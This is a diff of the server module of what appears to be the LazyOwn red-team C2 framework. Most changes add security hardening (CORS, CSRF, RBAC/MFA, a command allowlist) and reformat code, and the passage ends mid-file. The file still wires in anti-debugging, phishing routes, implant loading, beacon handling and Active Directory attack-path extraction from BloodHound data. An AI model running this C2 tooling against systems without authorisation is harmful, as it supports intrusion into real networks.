@@ -1,100 +1,153 @@
-import re
-import os
+import base64
 import csv
-import pty
-import sys
-import ssl
-import json
-import yaml
-import glob
-import stat
-import time
-import uuid
+import dataclasses
 import errno
 import fcntl
-import shlex
-import socket
-import base64
-import select
-import struct
+import glob
+import hashlib
+import hmac
 import html
-import yagmail
-import smtplib
-import secrets
-import termios
-import sqlite3
+import json
 import logging
-import zipfile
-import requests
-import markdown
-import threading
-import validators
+import os
+import pty
+import re
+import secrets
+import select
+import socket
+import sqlite3
+import stat
+import string
+import struct
 import subprocess
-import pandas as pd
-from math import ceil
-from io import StringIO
-from pathlib import Path
-from functools import wraps
-from threading import Thread
-from lazyown import LazyOwnShell
-from flask_limiter import Limiter
-from urllib.parse import urlparse
-from collections import defaultdict
-from modules.colors import retModel
-from email.mime.text import MIMEText
-from email.mime.image import MIMEImage
-from watchdog.observers import Observer
+import sys
+import termios
+import threading
+import time
+import uuid
+import zipfile
 from datetime import datetime, timezone
-from werkzeug.utils import secure_filename
-from email.mime.multipart import MIMEMultipart
-from dnslib.server import DNSServer, DNSLogger
-from jinja2 import Environment, FileSystemLoader
-from flask_limiter.util import get_remote_address
-from watchdog.events import FileSystemEventHandler
-from modules.lazygptcli2 import process_prompt, Groq
-from modules.lazygptvulns import process_prompt_vuln
-from modules.lazygpttask import process_prompt_task
-from modules.lazyredopgpt import process_prompt_redop
-from modules.lazyagentAi import process_prompt_search
-from modules.lazygptcli3 import process_prompt_script
-from modules.lazygptcli5 import process_prompt_general
+from functools import wraps
+from io import StringIO
+from math import ceil
+from pathlib import Path
+from threading import Thread
+from urllib.parse import urlparse
+
+import markdown
+import requests
+import validators
+import yagmail
+import yaml
 from cryptography.hazmat.backends import default_backend
-from modules.lazygptcli4 import process_prompt_adversary
-from flask_socketio import SocketIO, send, emit, disconnect
-from modules.lazyphishingai import process_prompt_local_yaml
-from dnslib.server import DNSServer, BaseResolver, DNSLogger
-from utils import getprompt, Config, load_payload, anti_debug
-from modules.lazydeepseekcli_local import process_prompt_local
-from modules.lazydeepseekcli_localreport import process_prompt_localreport
-from werkzeug.security import generate_password_hash, check_password_hash
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, TXT, CNAME, MX, NS, SOA, CAA, TLSA, SSHFP
-from dnslib.dns import RR, QTYPE, A, NS, SOA, TXT, CNAME, MX, AAAA, PTR, SRV, NAPTR, CAA, TLSA, SSHFP
-from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
-from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory, render_template_string, flash, abort, jsonify, Response, stream_with_context, Blueprint, send_file, current_app
+from dnslib import CAA, CNAME, MX, NS, QTYPE, RR, SOA, SSHFP, TLSA, TXT, A
+from dnslib.server import BaseResolver, DNSServer
+from flask import (
+    Blueprint,
+    Flask,
+    Response,
+    abort,
+    flash,
+    jsonify,
+    redirect,
+    render_template,
+    render_template_string,
+    request,
+    send_file,
+    send_from_directory,
+    session,
+    url_for,
+)
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+from flask_login import LoginManager, UserMixin, current_user, login_required, login_user, logout_user
+from flask_socketio import SocketIO, disconnect, emit
+from jinja2 import Environment, FileSystemLoader
+from watchdog.events import FileSystemEventHandler
+from watchdog.observers import Observer
+from werkzeug.exceptions import HTTPException
+from werkzeug.security import check_password_hash, generate_password_hash
+from werkzeug.utils import secure_filename
 
 from cli.palette import CommandIndexError as _PaletteIndexError
 from cli.palette import load_index as _palette_load_index
 from cli.palette_command import build_palette_view as _palette_build_view
-from modules.metrics import REGISTRY
+from core.hardening import (
+    is_safe_dir_path as _is_safe_dir_path,
+)
+from core.hardening import (
+    is_safe_yaml_name as _is_safe_yaml_name,
+)
+from core.hardening import (
+    safe_join_under as _safe_join_under,
+)
+from core.hardening import (
+    store_secret_owner_only as _store_secret_owner_only,
+)
+from lazyc2.security.command_allowlist import CommandAllowlist
+from lazyc2.security.constants import AES_KEY_SIZE_BYTES as _AES_KEY_SIZE_BYTES
+from lazyc2.security.cors import CorsPolicy
+from lazyc2.security.csrf import CSRFPolicy
+from lazyc2.security.html_sanitizer import sanitize_html as _lazyc2_sanitize_html
+from lazyc2.security.https_redirect import HTTPSRedirect
+from lazyc2.security.services import (
+    AESKeyManager as _AESKeyManager,
+)
+from lazyc2.security.services import (
+    SafeFileService as _SafeFileService,
+)
+from lazyc2.security.services import (
+    SecretKeyManager as _SecretKeyManager,
+)
+from lazyc2.security.trusted_proxy import TrustedProxyResolver
+from lazyc2.security.validators import (
+    resolve_contained_file_path as _resolve_contained_file_path,
+)
+from lazyc2.security.validators import (
+    validate_file_path_within_base as _validate_file_path_within_base,
+)
+from lazyc2.security.validators import (
+    validate_password_length as _validate_password_length,
+)
+from lazyc2.security.validators import (
+    validate_route_path as _validate_route_path,
+)
+from lazyc2.security.validators import (
+    validate_template_name as _validate_template_name,
+)
+from modules.colors import retModel
 from modules.listener_manager import ListenerManager
 from modules.live_surface import build_live_graph
+from modules.llm_adapter import (
+    process_prompt,
+    process_prompt_adversary,
+    process_prompt_general,
+    process_prompt_local,
+    process_prompt_local_yaml,
+    process_prompt_localreport,
+    process_prompt_redop,
+    process_prompt_script,
+    process_prompt_search,
+    process_prompt_task,
+    process_prompt_vuln,
+    safe_groq_client,
+)
+from modules.logging_config import configure as _configure_logging
+from modules.metrics import REGISTRY
 from modules.security_sanitizers import (
     BindAddressResolver,
     OutputSanitizer,
     SessionPathResolver,
     build_default_config,
 )
-from lazyc2.security.validators import (
-    validate_route_path as _validate_route_path,
-    validate_template_name as _validate_template_name,
-    validate_file_path_within_base as _validate_file_path_within_base,
-)
-from lazyc2.security.services import (
-    AESKeyManager as _AESKeyManager,
-    SecretKeyManager as _SecretKeyManager,
-)
-from lazyc2.security.constants import AES_KEY_SIZE_BYTES as _AES_KEY_SIZE_BYTES
+from utils import Config, anti_debug, getprompt, load_payload
+
+_YAML_VIEW_MAX_FILES = 500
+_YAML_VIEW_MAX_BYTES = 1_000_000
+_YAML_VIEW_MAX_TESTS = 2000
+_YAML_VIEW_TESTS_PER_FILE = 100
+_YAML_VIEW_DIR_MAX_LENGTH = 256
 
 _LAZYOWN_SECRET_KEY_ENV = "LAZYOWN_SECRET_KEY"
 
@@ -102,11 +155,105 @@ _LAZYOWN_SECRET_KEY_ENV = "LAZYOWN_SECRET_KEY"
 anti_debug()
 logger = logging.getLogger(__name__)
 
+try:
+    import pyotp
+
+    from modules.lazy_rbac import (
+        MFA_ISSUER,
+        ROLE_DEFAULT,
+        Permission,
+        RBACStore,
+        RBACUser,
+        Role,
+        TenantManager,
+        check_cli_permission,  # noqa: F401
+        generate_mfa_qr_url,
+        get_rbac_store,
+        get_tenant_manager,
+        get_user_role,  # noqa: F401
+        require_mfa,  # noqa: F401
+        require_permission,
+        require_role,
+        set_rbac_store,
+        set_tenant_manager,
+    )
+
+    _RBAC_AVAILABLE = True
+except ImportError:
+    _RBAC_AVAILABLE = False
+    logging.getLogger(__name__).warning("[rbac] lazy_rbac.py not available; RBAC disabled")
+
 
 _payload_snapshot = load_payload()
 config = Config(_payload_snapshot)
+try:
+    from core.session_secrets import ensure_session_secrets as _ensure_session_secrets
+
+    _ensure_session_secrets(config, rotate=bool(getattr(config, "rotate_keys_on_boot", True)))
+except Exception as _rat_exc:
+    logging.getLogger(__name__).warning("[c2] session secrets bootstrap deferred: %s", _rat_exc)
 _security_config = build_default_config(_payload_snapshot)
 _output_sanitizer = OutputSanitizer(_security_config)
+
+
+def _env_tag() -> str:
+    """Return the runtime environment tag from ``payload.json``.
+
+    Returns:
+        The value of ``env`` in the payload, uppercased and defaulted
+        to ``"DEV"``. The :class:`CorsPolicy` and :class:`HTTPSRedirect`
+        both branch on this value.
+    """
+    raw = getattr(config, "env", "DEV")
+    return str(raw or "DEV").upper()
+
+
+def is_insecure_credential(user: str, pwd: str) -> bool:
+    """Check for weak or default credentials"""
+    weak_users = {"LazyOwn", "admin", "root", "user", ""}
+    weak_passes = {"LazyOwn", "password", "123456", "admin", ""}
+
+    if user in weak_users or pwd in weak_passes:
+        return True
+    if len(pwd) < 12:
+        return True
+    return False
+
+
+_cors_policy = CorsPolicy(
+    env=_env_tag(),
+    lhost=str(getattr(config, "lhost", "127.0.0.1")),
+    allowed_origins=getattr(config, "c2_allowed_origins", "") or "",
+    c2_port=int(getattr(config, "c2_port", 5000) or 5000),
+)
+_csrf_policy = CSRFPolicy(
+    exempt_paths=("/login", "/logout", "/register", "/api/beacon"),
+)
+_https_redirect_policy = HTTPSRedirect(
+    env=_env_tag(),
+    enabled=bool(getattr(config, "c2_https_redirect", True)),
+)
+_trusted_proxy_resolver = TrustedProxyResolver(
+    trusted_count=int(getattr(config, "c2_trusted_proxy_count", 0) or 0),
+    operator_allowlist=(
+        str(getattr(config, "c2_operator_ip_allowlist", "127.0.0.1") or "127.0.0.1")
+        .replace("{lhost}", str(getattr(config, "lhost", "127.0.0.1")))
+        .split(",")
+    ),
+)
+_audit_log_path = os.path.join(os.getcwd(), "sessions", "api_command_audit.jsonl")
+_command_allowlist = CommandAllowlist(
+    allowed=(
+        str(
+            getattr(
+                config,
+                "c2_api_command_allowlist",
+                "ping,set,show,help,status,sessions,sitrep",
+            )
+        ).split(",")
+    ),
+    audit_log_path=_audit_log_path,
+)
 
 
 def _listen_address():
@@ -120,8 +267,8 @@ def _listen_address():
     exposing the C2 on every interface.
     """
     candidates = (
-        getattr(config, 'c2_bind_address', None),
-        getattr(config, 'lhost', None),
+        getattr(config, "c2_bind_address", None),
+        getattr(config, "lhost", None),
     )
     resolver = BindAddressResolver(_security_config, candidates)
     return resolver.resolve()
@@ -181,6 +328,7 @@ def _select_specific_bind_address(candidate: object) -> str:
         return loopback
     try:
         import ipaddress as _ipaddress
+
         _ipaddress.ip_address(stripped)
     except (ValueError, ImportError):
         return loopback
@@ -275,7 +423,9 @@ def _resolve_bind_address(
     if loopback_fallback not in candidates:
         candidates.append(loopback_fallback)
     if getattr(_security_config, "allow_unspecified_bind", False):
-        unspecified = getattr(_security_config, "bind_unspecified_address", _UNSPECIFIED_ADDRESS) or _UNSPECIFIED_ADDRESS
+        unspecified = (
+            getattr(_security_config, "bind_unspecified_address", _UNSPECIFIED_ADDRESS) or _UNSPECIFIED_ADDRESS
+        )
         if unspecified not in candidates:
             candidates.append(unspecified)
 
@@ -287,12 +437,12 @@ def _resolve_bind_address(
     return loopback_fallback
 
 
-phishing_bp = Blueprint('phishing', __name__, template_folder='templates/phishing')
+phishing_bp = Blueprint("phishing", __name__, template_folder="templates/phishing")
 
-if config.enable_c2_debug == True:
-    logging.basicConfig(filename='sessions/access.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+if config.enable_c2_debug:
+    _configure_logging(level=logging.INFO, log_dir="sessions", console=True, file=True)
 else:
-    logging.basicConfig(filename='sessions/access.log', level=logging.CRITICAL, format='%(asctime)s - %(levelname)s - %(message)s')
+    _configure_logging(level=logging.CRITICAL, log_dir="sessions", console=True, file=True)
 
 
 class _JsonLogFormatter(logging.Formatter):
@@ -300,6 +450,7 @@ class _JsonLogFormatter(logging.Formatter):
 
     def format(self, record):
         import datetime as _dt
+
         payload = {
             "timestamp": _dt.datetime.now(_dt.timezone.utc).replace(tzinfo=None).isoformat() + "Z",
             "level": record.levelname,
@@ -323,37 +474,41 @@ if getattr(config, "enable_structured_logging", False):
     _json_handler.setFormatter(_JsonLogFormatter())
     logging.getLogger().addHandler(_json_handler)
 
+
 def ensure_sessions_dir():
     """Ensure the sessions directory exists with safe permissions."""
     try:
-        os.makedirs('sessions', exist_ok=True)
-        os.chmod('sessions', stat.S_IRWXU)  # 700: Owner read/write/execute only
+        os.makedirs("sessions", exist_ok=True)
+        os.chmod("sessions", stat.S_IRWXU)  # 700: Owner read/write/execute only
     except OSError as e:
         if e.errno != errno.EEXIST:
             logger.error(f"Failed to create sessions directory: {e}")
             raise
 
+
 def load_routes():
     """Load dynamic routes from JSON file."""
     try:
-        with open('sessions/routes_to_templates.json', 'r') as f:
+        with open("sessions/routes_to_templates.json", "r") as f:
             return json.load(f)
     except (FileNotFoundError, json.JSONDecodeError) as e:
         logger.error(f"Failed to load routes: {e}")
         return {}
 
+
 def save_routes(routes):
     """Save dynamic routes to JSON file with safe permissions."""
     try:
         ensure_sessions_dir()
-        temp_file = 'sessions/routes_to_templates.json.tmp'
-        with open(temp_file, 'w') as f:
+        temp_file = "sessions/routes_to_templates.json.tmp"
+        with open(temp_file, "w") as f:
             json.dump(routes, f, indent=2)
-        os.rename(temp_file, 'sessions/routes_to_templates.json')
-        os.chmod('sessions/routes_to_templates.json', stat.S_IRUSR | stat.S_IWUSR)  # 600: Owner read/write only
+        os.rename(temp_file, "sessions/routes_to_templates.json")
+        os.chmod("sessions/routes_to_templates.json", stat.S_IRUSR | stat.S_IWUSR)  # 600: Owner read/write only
     except Exception as e:
         logger.error(f"Failed to save routes: {e}")
         raise
+
 
 def validate_route_path(route_path):
     """Module-level boolean adapter for :func:`lazyc2.security.validators.validate_route_path`.
@@ -407,6 +562,7 @@ def is_safe_template_path(template_path, template_name):
     is_valid, _ = _validate_file_path_within_base(candidate, template_folder)
     return is_valid
 
+
 def _sanitize_command_output(value):
     """Return a JSON-safe projection of ``value`` without exception details.
 
@@ -434,9 +590,9 @@ def is_binary(safe_filename):
     """
     if not safe_filename or not isinstance(safe_filename, str):
         return False
-    if safe_filename in ('.', '..'):
+    if safe_filename in (".", ".."):
         return False
-    if '/' in safe_filename or '\\' in safe_filename or '\x00' in safe_filename:
+    if "/" in safe_filename or "\\" in safe_filename or "\x00" in safe_filename:
         return False
     if os.path.basename(safe_filename) != safe_filename:
         return False
@@ -451,61 +607,30 @@ def is_binary(safe_filename):
         return False
     header_max_len = max((len(h) for h in BINARY_HEADERS), default=4)
     try:
-        with open(candidate_real, 'rb') as f:
+        with open(candidate_real, "rb") as f:
             header = f.read(header_max_len)
     except OSError:
         return False
     return any(header.startswith(b_header) for b_header in BINARY_HEADERS)
 
-def get_request_details():
-    """Extract and return request details as a dictionary."""
-    return {
-        'method': request.method,
-        'headers': dict(request.headers),
-        'args': request.args.to_dict(),
-        'form': request.form.to_dict(),
-        'json': request.get_json(silent=True),
-        'remote_addr': request.remote_addr,
-        'url': request.url,
-        'timestamp': str(uuid.uuid4())
-    }
-
-def save_to_log(details):
-    """Save request details to JSON log file with safe permissions."""
-    try:
-        ensure_sessions_dir()
-        log_file = 'sessions/request_log.json'
-        logs = []
-        if os.path.exists(log_file):
-            with open(log_file, 'r') as f:
-                logs = json.load(f)
-        logs.append(details)
-        temp_file = 'sessions/request_log.json.tmp'
-        with open(temp_file, 'w') as f:
-            json.dump(logs, f, indent=2)
-        os.rename(temp_file, log_file)
-        os.chmod(log_file, stat.S_IRUSR | stat.S_IWUSR)  # 600: Owner read/write only
-        return {'status': 'logged', 'id': details['timestamp']}
-    except Exception as e:
-        logger.error(f"Failed to save log: {e}")
-        return {'error': 'Log save failed'}, 500
-
 
 def clean_expired_tokens():
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
-    cursor.execute('DELETE FROM auth_tokens WHERE expiry < ?', (int(time.time()),))
+    cursor.execute("DELETE FROM auth_tokens WHERE expiry < ?", (int(time.time()),))
     conn.commit()
     conn.close()
 
-def clean_json(texto):
+
+def clean_json(text):
     """Extract only the JSON content between ```json and ```, discarding everything else."""
-    match = re.search(r'```json\n(.*?)\n```', texto, re.DOTALL)
+    match = re.search(r"```json\n(.*?)\n```", text, re.DOTALL)
     if match:
         return match.group(1).strip()
     return ""
 
-_SAFE_YAML_NAME_RE = re.compile(r'^[a-zA-Z0-9_\-]+\.(yml|yaml)$')
+
+_SAFE_YAML_NAME_RE = re.compile(r"^[a-zA-Z0-9_\-]+\.(yml|yaml)$")
 
 
 def _resolve_within(allowed_base, name):
@@ -581,7 +706,7 @@ def load_yaml_safely(file_path):
             logger.error("No read permission for YAML file")
             return None
 
-        with open(clean_path, 'r', encoding='utf-8') as f:
+        with open(clean_path, "r", encoding="utf-8") as f:
             data = yaml.safe_load(f)
 
             if data is None:
@@ -592,8 +717,8 @@ def load_yaml_safely(file_path):
                 logger.error("YAML file must contain a dictionary")
                 return None
 
-            data.setdefault('beacon_url', '')
-            data.setdefault('created_at', datetime.now(timezone.utc).isoformat())
+            data.setdefault("beacon_url", "")
+            data.setdefault("created_at", datetime.now(timezone.utc).isoformat())
             return data
 
     except yaml.YAMLError:
@@ -606,6 +731,7 @@ def load_yaml_safely(file_path):
         logger.exception("Error loading YAML")
         return None
 
+
 class Handler(FileSystemEventHandler):
     @staticmethod
     def on_any_event(event):
@@ -616,9 +742,9 @@ class Handler(FileSystemEventHandler):
             event_info = {
                 "type": event.event_type,
                 "src_path": event.src_path,
-                "dest_path": getattr(event, 'dest_path', None),
+                "dest_path": getattr(event, "dest_path", None),
                 "size": os.path.getsize(event.src_path) if os.path.exists(event.src_path) else None,
-                "timestamp": datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat(),
             }
             if event.src_path.startswith(f"{BASE_DIR}{rhost}"):
                 global counter_events
@@ -626,11 +752,12 @@ class Handler(FileSystemEventHandler):
                 counter_events += 1
                 events.append(event_info)
                 if counter_events >= 1000:
-                    events.sort(key=lambda x: x['timestamp'], reverse=True)
+                    events.sort(key=lambda x: x["timestamp"], reverse=True)
                     events = events[:1000]
-        except Exception as e:
-            if config.enable_c2_debug == True:
-                logger.info(f"Error watchdog")
+        except Exception:
+            if config.enable_c2_debug:
+                logger.info("Error watchdog")
+
 
 def get_karma_name(elo):
     if elo < 1000:
@@ -648,68 +775,89 @@ def get_karma_name(elo):
     else:
         return "Godlike"
 
+
 def fromjson(value):
     return json.loads(value)
+
 
 def run_shell():
     while True:
         try:
             shell.cmdloop()
-        except Exception as e:
-            if config.enable_c2_debug == True:
-                logger.info(f"[ERROR] Shell loop crashed:")
+        except Exception:
+            if config.enable_c2_debug:
+                logger.info("[ERROR] Shell loop crashed:")
             break
+
 
 def load_banners():
     """Loads the banners from the JSON file."""
     try:
-        with open('sessions/banners.json', 'r') as file:
+        with open("sessions/banners.json", "r") as file:
             config_banner = json.load(file)
     except FileNotFoundError:
-        if config.enable_c2_debug == True:
+        if config.enable_c2_debug:
             logger.info("Error: File banners.json not found")
         return
+    except json.JSONDecodeError:
+        if config.enable_c2_debug:
+            logger.info("Error: Invalid JSON in banners.json")
+        return
+    if isinstance(config_banner, dict) and "banners" in config_banner:
+        return config_banner.get("banners", [])
+    if isinstance(config_banner, list):
+        return config_banner
     return config_banner
+
 
 def load_mitre_data():
     mitre_path = os.path.join("external", ".exploit", "mitre", "enterprise-attack", "enterprise-attack-16.1.json")
     with open(mitre_path, "r") as f:
         return json.load(f)
 
+
 def load_event_config():
     try:
-        with open('event_config.json', 'r') as f:
+        with open("event_config.json", "r") as f:
             return json.load(f)
     except FileNotFoundError:
         return {"events": []}
 
+
 def load_notifications():
-    JSON_FILE_PATH = 'sessions/notifications.json'
+    JSON_FILE_PATH = "sessions/notifications.json"
     if not os.path.exists(JSON_FILE_PATH):
-        with open(JSON_FILE_PATH, 'w') as f:
+        os.makedirs(os.path.dirname(JSON_FILE_PATH), exist_ok=True)
+        tmp = JSON_FILE_PATH + ".tmp"
+        with open(tmp, "w") as f:
             json.dump([], f)
-    with open(JSON_FILE_PATH, 'r') as f:
-        notifications = json.load(f)
+        os.replace(tmp, JSON_FILE_PATH)
+    try:
+        with open(JSON_FILE_PATH, "r") as f:
+            notifications = json.load(f)
+    except (OSError, json.JSONDecodeError):
+        notifications = [{"html": "Notification store reset due to corruption"}]
+    if not isinstance(notifications, list):
+        notifications = [{"html": "Notification store reset — expected list"}]
     return notifications
+
 
 def implants_check():
     implants["implants"].clear()
 
-    implant_files = glob.glob(os.path.join(BASE_DIR, 'implant_config*.json'))
+    implant_files = glob.glob(os.path.join(BASE_DIR, "implant_config*.json"))
     logging.info(implant_files)
     if implant_files:
         for i, file in enumerate(implant_files, start=1):
             try:
-                with open(file, 'r') as f:
+                with open(file, "r") as f:
                     logging.info("Info: Implants created.")
                     content = f.read().strip()
-                    implants["implants"].append({
-                        "implant": i,
-                        "content": content
-                    })
-            except Exception as e:
-                if config.enable_c2_debug == True:
-                    logger.info(f"[Error] reading file")
+                    implants["implants"].append({"implant": i, "content": content})
+            except Exception:
+                if config.enable_c2_debug:
+                    logger.info("[Error] reading file")
+
 
 def extract_attack_vectors(nodes, edges):
     """
@@ -723,78 +871,80 @@ def extract_attack_vectors(nodes, edges):
         dict: Structured data containing critical attack vectors.
     """
     ad_data = {
-        'privileged_accounts': [],
-        'dangerous_permissions': [],
-        'potential_attack_paths': [],
-        'misconfigurations': []
+        "privileged_accounts": [],
+        "dangerous_permissions": [],
+        "potential_attack_paths": [],
+        "misconfigurations": [],
     }
 
-
     for node in nodes:
-        if node.get('type') in ['User', 'Group'] and node.get('label', '').lower() in [
-            'domain admins', 'enterprise admins', 'administrators'
+        if node.get("type") in ["User", "Group"] and node.get("label", "").lower() in [
+            "domain admins",
+            "enterprise admins",
+            "administrators",
         ]:
-            ad_data['privileged_accounts'].append({
-                'id': node['id'],
-                'label': node['label'],
-                'type': node['type'],
-                'details': node['title']
-            })
+            ad_data["privileged_accounts"].append(
+                {"id": node["id"], "label": node["label"], "type": node["type"], "details": node["title"]}
+            )
 
-
-    dangerous_rights = ['GenericAll', 'WriteDacl', 'WriteOwner', 'Owns', 'AllExtendedRights', 'DCSync']
+    dangerous_rights = ["GenericAll", "WriteDacl", "WriteOwner", "Owns", "AllExtendedRights", "DCSync"]
     for edge in edges:
-        if edge['label'] in dangerous_rights:
-            source_node = next((n for n in nodes if n['id'] == edge['from']), None)
-            target_node = next((n for n in nodes if n['id'] == edge['to']), None)
+        if edge["label"] in dangerous_rights:
+            source_node = next((n for n in nodes if n["id"] == edge["from"]), None)
+            target_node = next((n for n in nodes if n["id"] == edge["to"]), None)
             if source_node and target_node:
-                ad_data['dangerous_permissions'].append({
-                    'from': source_node['label'],
-                    'to': target_node['label'],
-                    'right': edge['label'],
-                    'source_type': source_node['type'],
-                    'target_type': target_node['type']
-                })
+                ad_data["dangerous_permissions"].append(
+                    {
+                        "from": source_node["label"],
+                        "to": target_node["label"],
+                        "right": edge["label"],
+                        "source_type": source_node["type"],
+                        "target_type": target_node["type"],
+                    }
+                )
 
-
-    domain_admin_group = next(
-        (n for n in nodes if n.get('label', '').lower() == 'domain admins'), None
-    )
+    domain_admin_group = next((n for n in nodes if n.get("label", "").lower() == "domain admins"), None)
     if domain_admin_group:
         paths = []
         for edge in edges:
-            if edge['to'] == domain_admin_group['id'] and edge['label'] == 'MemberOf':
-                source_node = next((n for n in nodes if n['id'] == edge['from']), None)
+            if edge["to"] == domain_admin_group["id"] and edge["label"] == "MemberOf":
+                source_node = next((n for n in nodes if n["id"] == edge["from"]), None)
                 if source_node:
-                    paths.append({
-                        'path': f"{source_node['label']} -> Domain Admins",
-                        'type': source_node['type'],
-                        'details': f"{source_node['type']} has direct membership to Domain Admins"
-                    })
+                    paths.append(
+                        {
+                            "path": f"{source_node['label']} -> Domain Admins",
+                            "type": source_node["type"],
+                            "details": f"{source_node['type']} has direct membership to Domain Admins",
+                        }
+                    )
 
-            if edge['label'] in ['AdminTo', 'DCSync']:
-                source_node = next((n for n in nodes if n['id'] == edge['from']), None)
-                target_node = next((n for n in nodes if n['id'] == edge['to']), None)
+            if edge["label"] in ["AdminTo", "DCSync"]:
+                source_node = next((n for n in nodes if n["id"] == edge["from"]), None)
+                target_node = next((n for n in nodes if n["id"] == edge["to"]), None)
                 if source_node and target_node:
-                    paths.append({
-                        'path': f"{source_node['label']} -> {target_node['label']}",
-                        'type': edge['label'],
-                        'details': f"{source_node['type']} has {edge['label']} rights on {target_node['type']}"
-                    })
-        ad_data['potential_attack_paths'] = paths
-
+                    paths.append(
+                        {
+                            "path": f"{source_node['label']} -> {target_node['label']}",
+                            "type": edge["label"],
+                            "details": f"{source_node['type']} has {edge['label']} rights on {target_node['type']}",
+                        }
+                    )
+        ad_data["potential_attack_paths"] = paths
 
     for node in nodes:
-        if node.get('type') == 'Computer':
-            properties = json.loads(node.get('title', '{}'))
-            if properties.get('unconstraineddelegation', False):
-                ad_data['misconfigurations'].append({
-                    'label': node['label'],
-                    'type': 'Unconstrained Delegation',
-                    'details': 'Computer allows unconstrained delegation, enabling potential privilege escalation.'
-                })
+        if node.get("type") == "Computer":
+            properties = json.loads(node.get("title", "{}"))
+            if properties.get("unconstraineddelegation", False):
+                ad_data["misconfigurations"].append(
+                    {
+                        "label": node["label"],
+                        "type": "Unconstrained Delegation",
+                        "details": "Computer allows unconstrained delegation, enabling potential privilege escalation.",
+                    }
+                )
 
     return ad_data
+
 
 def process_bloodhound_zip(zip_filepath):
     """
@@ -811,7 +961,7 @@ def process_bloodhound_zip(zip_filepath):
     error_message = None
 
     try:
-        with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
+        with zipfile.ZipFile(zip_filepath, "r") as zip_ref:
             json_files = [name for name in zip_ref.namelist() if name.endswith(".json")]
             if not json_files:
                 return [], [], "No JSON files found in the ZIP", {}
@@ -820,58 +970,61 @@ def process_bloodhound_zip(zip_filepath):
                 with zip_ref.open(name) as f:
                     try:
                         data = json.load(f)
-                        if config.enable_c2_debug == True:
+                        if config.enable_c2_debug:
                             logger.info(f"Processing file: {name}")
-                        if config.enable_c2_debug == True:
+                        if config.enable_c2_debug:
                             logger.info(f"Data structure: {json.dumps(data, indent=2)[:500]}...")
 
-                        items = data.get('data', []) if isinstance(data, dict) else data
+                        items = data.get("data", []) if isinstance(data, dict) else data
 
                         if not isinstance(items, list):
-                            if config.enable_c2_debug == True:
+                            if config.enable_c2_debug:
                                 logger.info(f"Unexpected data structure in {name}: {type(items)}")
                             continue
 
                         for item in items:
-                            if 'ObjectIdentifier' in item and 'Properties' in item:
-                                node_id = item['ObjectIdentifier']
+                            if "ObjectIdentifier" in item and "Properties" in item:
+                                node_id = item["ObjectIdentifier"]
                                 if node_id not in nodes_data:
-                                    properties = item['Properties']
+                                    properties = item["Properties"]
                                     nodes_data[node_id] = {
-                                        'id': node_id,
-                                        'label': properties.get('name', node_id),
-                                        'title': json.dumps(properties, indent=2),
-                                        'type': name.split('_')[1].replace('.json', '')
+                                        "id": node_id,
+                                        "label": properties.get("name", node_id),
+                                        "title": json.dumps(properties, indent=2),
+                                        "type": name.split("_")[1].replace(".json", ""),
                                     }
 
-                            if 'Aces' in item and isinstance(item['Aces'], list):
-                                for ace in item['Aces']:
-                                    if 'PrincipalSID' in ace and 'RightName' in ace:
-                                        edges_data.append({
-                                            'from': item['ObjectIdentifier'],
-                                            'to': ace['PrincipalSID'],
-                                            'label': ace['RightName']
-                                        })
+                            if "Aces" in item and isinstance(item["Aces"], list):
+                                for ace in item["Aces"]:
+                                    if "PrincipalSID" in ace and "RightName" in ace:
+                                        edges_data.append(
+                                            {
+                                                "from": item["ObjectIdentifier"],
+                                                "to": ace["PrincipalSID"],
+                                                "label": ace["RightName"],
+                                            }
+                                        )
 
-                            if 'PrimaryGroupSID' in item and item['PrimaryGroupSID']:
-                                edges_data.append({
-                                    'from': item['ObjectIdentifier'],
-                                    'to': item['PrimaryGroupSID'],
-                                    'label': 'MemberOf'
-                                })
+                            if "PrimaryGroupSID" in item and item["PrimaryGroupSID"]:
+                                edges_data.append(
+                                    {
+                                        "from": item["ObjectIdentifier"],
+                                        "to": item["PrimaryGroupSID"],
+                                        "label": "MemberOf",
+                                    }
+                                )
 
-                    except json.JSONDecodeError as e:
-                        if config.enable_c2_debug == True:
+                    except json.JSONDecodeError:
+                        if config.enable_c2_debug:
                             logger.info(f"Error decoding JSON in {name}: ")
                         error_message = f"Error decoding JSON in {name}: "
-                    except Exception as e:
-                        if config.enable_c2_debug == True:
+                    except Exception:
+                        if config.enable_c2_debug:
                             logger.info(f"Error processing {name}: ")
                         error_message = f"Error processing {name}: "
 
         if not nodes_data and not edges_data:
             error_message = "No valid nodes or edges extracted from the ZIP"
-
 
         ad_data = extract_attack_vectors(list(nodes_data.values()), edges_data)
 
@@ -883,12 +1036,13 @@ def process_bloodhound_zip(zip_filepath):
         error_message = f"Invalid or corrupted ZIP file: {zip_filepath}"
         logger.info(error_message)
         ad_data = {}
-    except Exception as e:
+    except Exception:
         error_message = f"An unexpected error occurred: {str('')}"
         logger.info(error_message)
         ad_data = {}
 
     return list(nodes_data.values()), edges_data, error_message, ad_data
+
 
 def start_watching():
     event_handler = Handler()
@@ -899,53 +1053,58 @@ def start_watching():
     try:
         while True:
             time.sleep(1)
-    except:
+    except (KeyboardInterrupt, SystemExit):
+        observer.stop()
+    except Exception:
         observer.stop()
     observer.join()
 
+
 def load_tasks():
-    if not os.path.exists('sessions/tasks.json'):
-        with open('sessions/tasks.json', 'w') as file:
+    if not os.path.exists("sessions/tasks.json"):
+        with open("sessions/tasks.json", "w") as file:
             json.dump([], file)
-    with open('sessions/tasks.json', 'r') as file:
+    with open("sessions/tasks.json", "r") as file:
         return json.load(file)
 
+
 def create_cves():
-    if not os.path.exists('sessions/cves.json'):
-        with open('sessions/cves.json', 'w') as json_file:
+    if not os.path.exists("sessions/cves.json"):
+        with open("sessions/cves.json", "w") as json_file:
             return json.dump({}, json_file)
 
+
 def load_cves():
-    if not os.path.exists('sessions/cves.json'):
-        with open('sessions/cves.json', 'w') as file:
+    if not os.path.exists("sessions/cves.json"):
+        with open("sessions/cves.json", "w") as file:
             json.dump([], file)
-    with open('sessions/cves.json', 'r') as file:
+    with open("sessions/cves.json", "r") as file:
         return json.load(file)
 
 
 def save_cves(cves):
